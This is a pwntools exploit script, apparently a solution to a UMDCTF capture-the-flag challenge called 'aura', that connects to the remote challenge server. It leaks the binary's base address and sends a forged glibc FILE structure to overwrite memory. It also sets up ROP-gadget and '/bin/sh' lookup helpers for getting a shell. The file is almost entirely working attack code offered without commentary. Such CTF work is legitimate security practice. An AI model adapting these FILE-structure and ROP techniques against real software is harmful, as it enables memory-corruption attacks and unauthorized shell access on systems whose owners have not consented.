from pwn import *
from icecream import ic

elf = exe = ELF("./aura")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.umdctf.io", 31006)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+181
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

ru("my aura: ")
elf.address = int(rl().strip(), 16) - elf.sym['aura']
ic(hex(elf.address))

payload = p64(0xfbad2488)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(elf.sym['aura'])         # buf base
payload += p64(elf.sym['aura']+0x1000)  # buf end 
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(elf.sym['aura'])         # chain (idk)
payload += p32(0)                       # fileno

s(payload)
sl(b'asdasd')
sl(b'asdasd')

io.interactive()
